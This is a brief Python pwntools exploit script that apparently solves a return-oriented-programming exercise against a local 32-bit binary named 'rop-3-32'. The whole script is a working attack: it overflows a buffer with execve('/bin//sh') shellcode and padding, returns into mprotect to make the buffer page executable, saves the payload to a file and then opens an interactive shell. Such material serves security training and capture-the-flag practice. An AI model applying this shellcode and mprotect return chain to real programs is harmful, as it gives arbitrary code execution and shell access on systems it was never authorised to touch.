#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-3-32')

"""
0x08048360  mprotect@plt
0x08048370  read@plt
"""

mprotect = p32(0x08048360)

g_buf = p32(0x804a060)
aligned = p32(0x804a000)

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xcaj\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

buf = shellcode
buf += "A" * (0x9c - len(shellcode))
buf += mprotect
buf += g_buf
buf += aligned
buf += p32(0x1000)
buf += p32(7)

with open("e.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
p.interactive()
